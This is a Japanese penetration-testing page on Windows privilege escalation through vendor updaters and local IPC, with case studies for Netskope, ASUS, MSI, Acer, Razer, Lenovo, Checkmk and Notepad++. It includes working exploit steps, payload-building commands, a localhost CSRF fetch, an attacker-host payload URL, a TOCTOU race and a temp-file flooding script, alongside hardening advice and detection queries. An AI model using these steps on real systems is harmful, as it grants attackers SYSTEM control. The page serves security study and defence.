# Enterprise Auto-Updaters と Privileged IPC の悪用（例: Netskope、ASUS、MSI）

{{#include ../../banners/hacktricks-training.md}}

このページでは、低いハードルで利用できる IPC サーフェスと、特権で実行されるアップデートフローを公開する、エンタープライズ向けエンドポイントエージェントやアップデーターに見られる Windows ローカル権限昇格チェーンの一種を一般化します。代表例は Netskope Client for Windows < R129（CVE-2025-0309）です。低権限ユーザーが登録処理を攻撃者が制御するサーバーへ誘導し、悪意のある MSI を配信して SYSTEM サービスにインストールさせることができます。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

類似製品に応用できる主なアイデア:
- 特権サービスの localhost IPC を悪用し、攻撃者のサーバーへの再登録や再構成を強制する。
- ベンダーのアップデートエンドポイントを実装し、不正な Trusted Root CA を配信したうえで、アップデーターに悪意のある「署名済み」パッケージを指定する。
- 弱い署名者チェック（CN allow-list）、任意のダイジェストフラグ、緩い MSI プロパティの検証を回避する。
- IPC が「暗号化」されている場合は、レジストリに保存された、全ユーザーが読み取り可能なマシン識別子からキー/IV を導出する。
- サービスがイメージパス/プロセス名で呼び出し元を制限している場合は、allow-list に含まれるプロセスに inject するか、プロセスを suspended で起動し、最小限のスレッドコンテキストパッチで DLL を bootstrap する。

カスタムのローカル TCP サービスは、PIN やその他のアプリケーション認証情報を要求する場合でも、同様に ID と入力境界を確認する必要があります。リスナーとそのプロセス、実効サービスアカウントを特定し、実際に配備されたバイナリ/バージョンを調べ、呼び出し元が制御できるフィールドが固定バッファーにコピーされる前、または子プロセスのコマンド構築に使われる前に長さチェックされているか確認します。[Microsoft's buffer-overrun guidance](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) では、特権ネイティブコードにおいて未検証の外部入力が危険な理由が説明されています。ループバックリスナー、ハードコードされた認証情報、またはプロセス名だけでは、メモリ破損や SYSTEM 実行が可能とは言えません。到達可能性、認可、コードパス、緩和策は、それぞれ別個の条件です。通常の列挙は受動的に行い、稼働中のサービスにクラッシュを引き起こす長さの入力を送信しないでください。

---
## 1) localhost IPC 経由で攻撃者のサーバーへの登録を強制する

多くのエージェントには、localhost TCP 経由で JSON を使って SYSTEM サービスと通信するユーザーモード UI プロセスが含まれています。

Netskope で確認された内容:
- UI: stAgentUI（low integrity）↔ Service: stAgentSvc（SYSTEM）
- IPC コマンド ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit の流れ:
1) バックエンドのホストを制御する claim（例: AddonUrl）を含む JWT 登録トークンを作成する。署名が不要になるよう alg=None を使用する。
2) JWT とテナント名を指定して、provisioning コマンドを呼び出す IPC メッセージを送信する:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) サービスが登録/設定のために不正なサーバーへの接続を開始します。例:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

注意:
- 呼び出し元の検証がパス/名前ベースの場合、許可リストに登録されたベンダーのバイナリからリクエストを送信します（§4 を参照）。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) 更新チャネルを乗っ取り、SYSTEM としてコードを実行する

クライアントがサーバーと通信するようになったら、想定されるエンドポイントを実装し、攻撃者の MSI を取得するよう誘導します。典型的な手順は次のとおりです。

1) /v2/config/org/clientconfig → 更新間隔を非常に短くした JSON 設定を返します。例:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificateを返す。サービスはこれをLocal Machine Trusted Rootストアにインストールします。
3) /v2/checkupdate → 悪意あるMSIと偽のバージョンを指すメタデータを指定します。

実環境でよく見られるチェックのバイパス:
- Signer CN allow-list: サービスはSubject CNが「netSkope Inc」または「Netskope, Inc.」と一致するかだけを確認する場合があります。rogue CAでそのCNを持つleafを発行し、MSIに署名できます。
- CERT_DIGESTプロパティ: CERT_DIGESTという名前の無害なMSIプロパティを含めます。インストール時の強制チェックはありません。
- オプションのdigest enforcement: config flag（例: check_msi_digest=false）により、追加の暗号検証が無効になります。

結果: SYSTEMサービスが
C:\ProgramData\Netskope\stAgent\data\*.msi
からMSIをインストールし、NT AUTHORITY\SYSTEMとして任意のコードを実行します。<sup>[[1]](#references)[[2]](#references)</sup>

パッチバイパスから得られる教訓: ベンダーが更新元を暗号学的に認証する代わりに、「信頼できる」ドメインを少数だけallow-listに登録して対応した場合でも、攻撃者がトラフィックを誘導できるベンダー所有のredirectorやreverse proxyを探しましょう。Netskopeの場合、公開された後続調査により、R129時代のallow-listは、攻撃者が制御するAzure App Serviceコンテンツをproxyする`rproxy.goskope.com`経由で、なお悪用可能だったことが示されました。hostname allow-listは信頼境界ではなく、時間稼ぎと考えてください。<sup>[[14]](#references)</sup>

---
## 3) Forging encrypted IPC requests (when present)

R127から、NetskopeはIPC JSONをBase64のように見えるencryptDataフィールドでラップしていました。解析の結果、任意のユーザーが読み取り可能なレジストリ値からkey/IVを導出するAES暗号化であることが判明しました:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻撃者は暗号化を再現し、標準ユーザー権限で有効な暗号化コマンドを送信できます。<sup>[[1]](#references)[[2]](#references)</sup> 一般的なヒント: エージェントが突然IPCを「暗号化」するようになった場合、HKLM配下にあるdevice ID、product GUID、install IDを素材として探しましょう。

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

一部のサービスは、TCP接続のPIDを特定し、イメージのpath/nameをProgram Files配下にあるallow-list登録済みのベンダーバイナリ（例: stagentui.exe、bwansvc.exe、epdlp.exe）と比較して、peerを認証しようとします。

実用的なバイパスは2つあります:
- allow-list登録済みのプロセス（例: nsdiag.exe）にDLL injectionし、その内部からIPCをproxyする。
- allow-list登録済みのバイナリをsuspended状態で起動し、CreateRemoteThreadを使わずにproxy DLLをbootstrapして、driverが強制するtamperルールを満たす（§5を参照）。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

製品には、保護対象プロセスへのハンドルから危険な権限を取り除くminifilter/OB callbacks driver（例: Stadrv）が含まれていることがよくあります:
- Process: PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUMEを削除
- Thread: THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZEに制限

これらの制約に従う、信頼性の高いuser-mode loader:
1) CREATE_SUSPENDEDを指定して、ベンダーバイナリをCreateProcessする。
2) まだ許可されているハンドルを取得する: プロセスにはPROCESS_VM_WRITE | PROCESS_VM_OPERATION、スレッドにはTHREAD_GET_CONTEXT/THREAD_SET_CONTEXT（または既知のRIP位置のコードをpatchする場合はTHREAD_RESUMEのみ）。
3) ntdll!NtContinue（または、早期に必ずマップされる別のthunk）を、DLLのpathを指定してLoadLibraryWを呼び出し、その後に元の位置へ戻る小さなstubで上書きする。
4) ResumeThreadを実行して、プロセス内でstubを起動し、DLLをロードする。

保護対象のプロセスに対してPROCESS_CREATE_THREADやPROCESS_SUSPEND_RESUMEを使うのではなく、自分でプロセスを作成したため、driverのポリシーを満たしています。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) 実用的なツール
- NachoVPN（Netskope plugin）は、rogue CAの作成、悪意あるMSIへの署名、および必要なendpoint（/v2/config/org/clientconfig、/config/ca/cert、/v2/checkupdate）の提供を自動化します。<sup>[[3]](#references)</sup>
- UpSkopeは、任意のIPCメッセージ（任意でAES暗号化）を作成するcustom IPC clientで、allow-list登録済みのバイナリから送信するためのsuspended-process injectionも備えています。<sup>[[4]](#references)</sup>

## 7) 不明なupdater/IPC surfaceの迅速なtriageワークフロー

新しいendpoint agentやマザーボードの「helper」suiteを調べる場合、privescの有望なターゲットかどうかは、通常、簡単なワークフローで判断できます。<sup>[[6]](#references)</sup>

1) loopback listenerを列挙し、ベンダーのプロセスと対応付けます:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) 候補となる名前付きパイプを列挙する：

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) プラグインベースの IPC サーバーが使用する、レジストリに保存されたルーティングデータを収集する：

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) まず user-mode client から endpoint 名、JSON key、command ID を抽出します。Packed Electron/.NET frontend からは、完全な schema が頻繁に leak します。

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) 最終的にプロセスを起動するコードパスだけでなく、実際の信頼判定条件を探す:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

優先して確認すべきパターン:
- `WinVerifyTrust` を使わずに `CryptQueryObject`/certificate parsing を行っている場合、「証明書が存在する」ことを「証明書が信頼されている」こととして扱っている可能性が高く、certificate cloning やその他の fake-signer tricks が可能になります。
- `Origin`、`Referer`、download URL、process name、signer CN に対する部分文字列/サフィックスチェックは認証ではありません。`contains(".vendor.com")` は、攻撃者が制御する類似ドメインを使って通常は悪用できます。
- 低権限の GUI が「ファイルは信頼できる」と判断し、SYSTEM broker がその結果を使うだけなら、クライアント側の DLL/JS を patch または再実装するだけで境界を完全に回避できることがあります（Razer-style split validation）。
- broker が payload を `%TEMP%`/`C:\Windows\Temp` にコピーしてから、そのパスを使って検証または実行をスケジュールする場合は、直ちに TOCTOU replacement window と、より弱いチェックを持つ別の `ExecuteTask()` wrapper を公開する sibling plugin module を調べてください。<sup>[[6]](#references)</sup>

名前付きパイプを多用するターゲットでは、プロトコルを詳しくリバースする前に弱い DACL とリモートから到達可能なパイプを見つける手段として、PipeViewer が手軽です。<sup>[[11]](#references)</sup>

ターゲットが caller を PID、image path、または process name だけで認証する場合、それを境界ではなく小さな障害と考えてください。正規のクライアントへの注入、または許可リストにあるプロセスからの接続だけで、サーバーのチェックを満たせることがよくあります。特に名前付きパイプについては、[クライアントの偽装とパイプの悪用に関するこのページ](named-pipe-client-impersonation.md)で、プリミティブを詳しく解説しています。

特権を持つ **cleanup or restore broker** では、パイプ ACL と同様にパスの信頼境界も調べてください。サービス実行ファイルとそのインストールディレクトリが保護されていても、低権限の caller が共有ディレクトリ内の復元先を指定したり、ステージング済みのバックアップアーティファクトの名前を変更したりできる場合があります。caller が restore command に到達できること、正確なステージング済み入力またはファイル名を変更できること、broker がより高い権限で実行されること、そして restore operation が実際に選択された保護パスに書き込むことを、それぞれ個別に確認してください。書き込み可能な staging directory や読み取り可能なパイプだけでは、任意の特権書き込みが成立するとは限りません。宛先のマッピングとサービスの動作には、コードレビューまたは管理されたテストが必要です。受動的な列挙中に未知の cleanup command を実行しないでください。ユーザーファイルを削除する可能性があります。

---
## 8) ベンダー署名だけで認証されるモジュール型アドイン broker（Lenovo Vantage のパターン）

新たに調査する価値のある変化形として、**signed-client RPC broker** があります。低権限の Lenovo 署名済みデスクトッププロセスが SYSTEM service と通信し、その service が `%ProgramData%` 配下にある XML 定義のアドイン群へ JSON command を振り分けます。受け入れられる署名済みクライアントのいずれかの**内部でコード実行**を達成すると、すべての `runas="system"` contract が攻撃対象になります。<sup>[[15]](#references)</sup>

Lenovo Vantage の調査で確認された、高価値のプリミティブ:
- **ベンダー署名済みであることを理由に caller を信頼する**: 研究者は、Lenovo 署名済み EXE を書き込み可能なディレクトリにコピーし、DLL side-load (`profapi.dll`) を成立させることで認証済みコンテキストに到達し、service がすでに信頼しているクライアント内で任意コードを実行しました。
- **manifest を使った攻撃対象の発見**: アドインは `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` 配下で宣言されています。いくつかの contract は `SYSTEM` として実行されるため、これらの manifest を列挙することで、broker 自体をリバースするより早く、実際の特権 verb が明らかになることがよくあります。
- **認証済みチャネルの背後にあるコマンド単位の脆弱性**: 信頼されたクライアント内に入ると、公開された調査により、update/install verb における path traversal と race condition、特権 settings database に対する raw-SQL abuse、意図された hive の外への書き込みを可能にする部分文字列ベースの registry path checks が見つかりました。

ターゲットで役立つ偵察:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

実践的な要点: ヘルパースイートが、まず**呼び出し元プロセス**を認証してから、数十ものプラグイン/add-inコマンドをディスパッチするブローカーを公開している場合、入口の信頼チェックをバイパスしただけで調査を終えてはいけません。マニフェスト/コントラクトテーブルをダンプし、各高権限verbを個別にファジングしてください。認証済みチャネルの背後には、通常、複数の二段階目のバグが隠れています。

---
## 1) 特権HTTP APIに対するブラウザーからlocalhostへのCSRF (ASUS DriverHub)

DriverHubは、127.0.0.1:53000でユーザーモードHTTPサービス (ADU.exe) を提供しています。このサービスは、https://driverhub.asus.com からのブラウザー呼び出しを想定しています。Originフィルターは、Originヘッダーと `/asus/v1.0/*` で公開されるダウンロードURLに対して、単純に `string_contains(".asus.com")` を実行します。そのため、`https://driverhub.asus.com.attacker.tld` のような攻撃者が制御するホストでもチェックを通過し、JavaScriptから状態を変更するリクエストを送信できます。<sup>[[6]](#references)</sup> 追加のバイパスパターンについては、[CSRFの基本](../../pentesting-web/csrf-cross-site-request-forgery.md)を参照してください。

実践的な手順:
1) `.asus.com` を含むドメインを登録し、そこに悪意のあるWebページをホストします。
2) `fetch` またはXHRを使って、`http://127.0.0.1:53000` の特権エンドポイント (例: `Reboot`、`UpdateApp`) を呼び出します。
3) ハンドラーが想定するJSONボディを送信します。パックされたフロントエンドJSに、以下のスキーマが示されています。

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

以下に示す PowerShell CLI も、Origin ヘッダーを信頼された値に偽装すると成功します：

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

攻撃者のサイトをブラウザーで訪問すると、1クリック（または `onload` を介した0クリック）のローカル CSRF が発生し、SYSTEM 権限のヘルパーを動作させます。

---
## 2) 安全でないコード署名検証と証明書のクローン（ASUS UpdateApp）

`/asus/v1.0/UpdateApp` は、JSON body で指定された任意の実行ファイルをダウンロードし、`C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` にキャッシュします。ダウンロード URL の検証には同じ部分文字列ロジックが使われているため、`http://updates.asus.com.attacker.tld:8000/payload.exe` が受け入れられます。ダウンロード後、ADU.exe は PE に署名が含まれていることと、Subject 文字列が ASUS に一致することだけを確認してから実行します。`WinVerifyTrust` も証明書チェーンの検証も行われません。

この処理を悪用するには:
1) ペイロードを作成する（例: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
2) ASUS の署名者をペイロードにクローンする（例: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
3) `.asus.com` に似せたドメインで `pwn.exe` をホストし、上記のブラウザー CSRF を介して UpdateApp を起動する。

Origin と URL のフィルターはどちらも部分文字列ベースで、署名者のチェックも文字列を比較するだけなので、DriverHub は攻撃者のバイナリを取得し、昇格されたコンテキストで実行します。<sup>[[6]](#references)</sup>

---
## 1) updater のコピー／実行処理における TOCTOU（MSI Center CMD_AutoUpdateSDK）

MSI Center の SYSTEM サービスは、各フレームが `4-byte ComponentID || 8-byte CommandID || ASCII arguments` で構成される TCP プロトコルを公開しています。core component（Component ID `0f 27 00 00`）には `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` が含まれています。そのハンドラーは次の処理を行います。
1) 指定された実行ファイルを `C:\Windows\Temp\MSI Center SDK.exe` にコピーする。
2) `CS_CommonAPI.EX_CA::Verify` を使って署名を検証する（証明書の subject が “MICRO-STAR INTERNATIONAL CO., LTD.” と一致し、`WinVerifyTrust` が成功する必要がある）。
3) 攻撃者が制御する引数を使い、SYSTEM として一時ファイルを実行する scheduled task を作成する。

コピーされたファイルは、検証から `ExecuteTask()` の実行までロックされません。攻撃者は次の操作を行えます。
- 正規の MSI 署名付きバイナリを指定した Frame A を送信する（署名チェックを確実に通過させ、task を登録する）。
- 検証完了直後に `MSI Center SDK.exe` を悪意のあるペイロードで上書きする Frame B メッセージを繰り返し送信し、競合させる。

scheduler が起動すると、元のファイルを検証済みであるにもかかわらず、上書きされたペイロードが SYSTEM 権限で実行されます。確実に悪用するには、TOCTOU の隙を突くまで、2つの goroutine/thread から CMD_AutoUpdateSDK を連続送信します。<sup>[[6]](#references)</sup>

---
## 2) 独自の SYSTEM レベル IPC と impersonation の悪用（MSI Center + Acer Control Centre）

### MSI Center の TCP command set
- `MSI.CentralServer.exe` がロードする各 plugin/DLL には、`HKLM\SOFTWARE\MSI\MSI_CentralServer` に保存された Component ID が割り当てられます。フレームの先頭4バイトで対象 component が選択されるため、攻撃者は任意の module にコマンドを送れます。
- plugin は独自の task runner を定義できます。`Support\API_Support.dll` は `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` を公開し、**署名検証なし**で `API_Support.EX_Task::ExecuteTask()` を直接呼び出します。任意のローカルユーザーが `C:\Users\<user>\Desktop\payload.exe` を指定すれば、確実に SYSTEM 権限で実行できます。
- Wireshark で loopback を sniff するか、dnSpy で .NET バイナリを解析すれば、Component と command の対応関係をすぐに特定できます。その後、独自の Go/Python client でフレームを再送できます。<sup>[[6]](#references)</sup>

### Acer Control Centre の named pipe と impersonation level
- `ACCSvc.exe`（SYSTEM）は `\\.\pipe\treadstone_service_LightMode` を公開しており、その discretionary ACL はリモートクライアント（例: `\\TARGET\pipe\treadstone_service_LightMode`）からのアクセスを許可しています。command ID `7` とファイルパスを送信すると、サービスのプロセス起動処理が呼び出されます。
- client library は、引数とともに magic terminator byte（113）をシリアライズします。Frida/`TsDotNetLib` を使った動的解析（instrumentation のヒントは [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) を参照）により、native handler がこの値を `SECURITY_IMPERSONATION_LEVEL` と integrity SID に対応付けてから `CreateProcessAsUser` を呼び出すことが分かります。
- 113（`0x71`）を114（`0x72`）に入れ替えると、SYSTEM token 全体を保持し、high-integrity SID（`S-1-16-12288`）を設定する generic branch に入ります。そのため、起動されたバイナリはローカルでもマシンをまたいでも、制限のない SYSTEM として実行されます。
- これに公開されている installer flag（`Setup.exe -nocheck`）を組み合わせれば、lab VM にも ACC をセットアップして、ベンダーのハードウェアなしで pipe を検証できます。<sup>[[6]](#references)</sup>

これらの IPC の脆弱性は、localhost サービスが相互認証（ALPC SID、`ImpersonationLevel=Impersonation` フィルター、token filtering）を強制すべき理由と、各 module の「任意のバイナリを実行する」ヘルパーで同じ署名検証を共有すべき理由を示しています。

---
## 3) 弱い user-mode 検証に依存する COM/IPC「elevator」ヘルパー（Razer Synapse 4）

Razer Synapse 4 は、この種の脆弱性に役立つ別のパターンを追加しました。低権限ユーザーが COM ヘルパーに `RzUtility.Elevator` 経由でプロセスを起動させる一方、信頼性の判断は、特権境界内で確実に強制されるのではなく、user-mode DLL（`simple_service.dll`）に委ねられています。

確認された悪用手順:
- COM object `RzUtility.Elevator` をインスタンス化する。
- `LaunchProcessNoWait(<path>, "", 1)` を呼び出し、昇格したプロセスの起動を要求する。
- 公開 PoC では、要求を出す前に `simple_service.dll` 内の PE 署名チェックを無効化するパッチを適用し、攻撃者が選んだ任意の実行ファイルを起動できるようにします。<sup>[[6]](#references)[[10]](#references)</sup>

最小限の PowerShell 呼び出し:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

一般的な要点: 「helper」スイートをリバースするときは、localhost TCP や named pipes だけで調査を止めないでください。`Elevator`、`Launcher`、`Updater`、`Utility` などの名前を持つ COM クラスを確認し、特権サービスが対象バイナリ自体を実際に検証しているのか、それともパッチ可能な user-mode クライアント DLL が計算した結果を単に信頼しているのかを確かめましょう。このパターンは Razer 以外にも当てはまります。高権限のブローカーが低権限側から受け取った許可／拒否の判断を利用する分割設計は、privesc の攻撃対象となる可能性があります。


---
## MSI repair 中の予測可能な一時スクリプト実行（Checkmk Agent / CVE-2024-0670）

一部の Windows agent は今も、`C:\Windows\Temp` に一時的な `.cmd` を書き込み、`SYSTEM` として実行することで特権操作を実装しています。ファイル名が予測可能で、サービスが既存ファイルを安全に作り直さない場合、低権限ユーザーは将来使われる一時ファイルを**読み取り専用**で事前に作成し、特権プロセスに独自のスクリプトではなく攻撃者が制御する内容を実行させることができます。

脆弱な Checkmk Agent ビルドで確認された内容:
- 一時ファイルのパターン: `cmk_all_<PID>_1.cmd`
- 影響を受けるブランチ: `2.0.0`、`2.1.0`、`2.2.0`
- トリガー: キャッシュされた agent パッケージの MSI **repair**<sup>[[8]](#references)[[9]](#references)</sup>

実践的な手順:
1. 現在のプロセス ID または実行中の agent の PID から、現実的な PID の範囲を推定します。
2. 短い **ASCII** の `.cmd` payload を書き込みます（`Set-Content -Encoding Ascii` または `cmd.exe` のリダイレクトを使用し、バッチファイルへの UTF-16 PowerShell 出力は避けます）。
3. 候補範囲にわたって `C:\Windows\Temp\cmk_all_<PID>_1.cmd` を大量に作成し、それぞれを読み取り専用にします。
4. キャッシュされた MSI の repair をトリガーし、特権サービスに一時スクリプトを再生成させてから実行させます。<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

脆弱な製品が Windows Installer でインストールされている場合は、修復を実行する前に、`C:\Windows\Installer` 配下にあるランダムな名前のキャッシュ済み MSI がどの製品のものか特定します:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

運用上の注意:
- `qwinsta` は、非対話型の WinRM shell から `msiexec /fa` が失敗し、既存のデスクトップ／切断状態のセッションで修復を正しくトリガーできるか確認したい場合に役立ちます。<sup>[[7]](#references)</sup>
- このパターンは、**world-writable な場所に一時スクリプトを配置し、後から SYSTEM として実行する**他のエンドポイントエージェントや updater にも当てはまります。予測可能な名前、排他的作成のセマンティクスの欠如、オンデマンドでトリガー可能な修復／更新フローをテストしてください。

### 対話型インストーラーの修復と特権コンソール

PDF24 Creator 11.15.1 は、MSI 修復に伴う別のリスクを示しています。プリンターのインストールに使われるカスタムアクションが、修復中に SYSTEM 権限で可視コンソールを起動する可能性があります。ベンダーはこの挙動に対処するため、11.15.2 で MSI インストーラーを変更しました。古い製品バージョンは、あくまでトリアージの手掛かりです。登録済みまたはアクセス可能な MSI パッケージの有無、このユーザーが修復を開始できるか、脆弱なカスタムアクションとログファイルの遅延が存在するか、対話型デスクトップでコンソールが表示されるかを確認してください。報告された遅延には `faxPrnInst.log` に対する oplock が使われていました。通常のファイル書き込み権限だけがアクセス条件ではありません。非対話型 shell、アクセスできないパッケージ、またはパッチ適用済みのインストーラーがあると、攻撃チェーンは成立しない可能性があります。この問題は `AlwaysInstallElevated` に依存せず、予測可能な一時スクリプトを置き換える手法とも異なります。

---
## 脆弱な updater 検証を悪用したリモートサプライチェーン乗っ取り（WinGUp / Notepad++）

2025年6月から2025年12月にかけて、Notepad++ の更新フローを支えるホスティングインフラを侵害した攻撃者が、標的とした被害者に悪意ある manifest を選択的に配信しました。古い WinGUp ベースの updater は更新の真正性を完全には検証していなかったため、悪意ある XML 応答によってクライアントを攻撃者管理下の URL に誘導できました。クライアントは、信頼された証明書チェーンとダウンロードしたインストーラーの有効な PE 署名の両方を必須にせず HTTPS コンテンツを受け入れたため、被害者はトロイの木馬化された NSIS の `update.exe` をダウンロードして実行しました。<sup>[[12]](#references)[[13]](#references)</sup>

運用フロー（ローカル exploit は不要）:
1. **インフラの傍受**: CDN／ホスティングを侵害し、悪意あるダウンロード URL を指す攻撃者の metadata を含む応答を更新チェックに返す。
2. **トロイの木馬化された NSIS**: インストーラーが payload を取得して実行し、2つの実行チェーンを悪用する:
   - **Bring-your-own signed binary + sideload**: 署名済みの Bitdefender `BluetoothService.exe` を同梱し、その検索パスに悪意ある `log.dll` を配置する。署名済みバイナリの実行時に、Windows が `log.dll` を sideload する。この DLL は Chrysalis backdoor（Warbird で保護され、静的検出を妨げるために API hashing を使用）を復号して reflectively load する。
   - **スクリプトによる shellcode injection**: NSIS が、Win32 API（例: `EnumWindowStationsW`）を使って shellcode を注入し、Cobalt Strike Beacon を配置するコンパイル済み Lua script を実行する。<sup>[[12]](#references)</sup>

あらゆる auto-updater に向けた hardening／検知の要点:
- ダウンロードしたインストーラーの**証明書と署名の検証**を必須にする（ベンダーの署名者を pin し、一致しない CN／chain を拒否）。また、更新 manifest 自体にも署名する（例: XMLDSig）。検証されていない限り、manifest で指定された redirect をブロックする。
- **BYO signed binary sideloading** をダウンロード後の検知ポイントとして扱う。署名済みベンダー EXE が正規のインストールパス外にある名前の DLL を読み込んだ場合（例: Bitdefender が Temp/Downloads から `log.dll` を読み込む場合）、および updater が Temp に非ベンダー署名のインストーラーを配置／実行した場合に alert を出す。
- このチェーンで確認された**マルウェア固有のアーティファクト**を監視する（汎用的な検知ポイントとして有用）: mutex `Global\Jdhfv_1.0.1`、`%TEMP%` への不審な `gup.exe` の書き込み、Lua による shellcode injection の各段階。
- Notepad++ は v8.8.9 以降で WinGUp を強化して対応しました。返される XML に署名（XMLDSig）が付与され、新しいビルドでは通信経路だけを信頼するのではなく、ダウンロードしたインストーラーの証明書と署名を検証するようになりました。<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender 署名済み EXE による <code>log.dll</code> sideload（T1574.001）</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> が Notepad++ 以外のインストーラーを起動</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

これらのパターンは、署名されていないマニフェストを受け入れる、またはインストーラーの署名者を固定していないあらゆるupdaterに当てはまります。ネットワークの乗っ取り + 悪意のあるインストーラー + BYO署名によるsideloadingにより、「信頼された」更新を装ったリモートコード実行が可能になります。

---
## References
- [1] [アドバイザリ – Netskope Client for Windows – Rogue Serverを介したローカル権限昇格 (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope セキュリティアドバイザリ NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskopeプラグイン](https://github.com/AmberWolfCyber/NachoVPN)
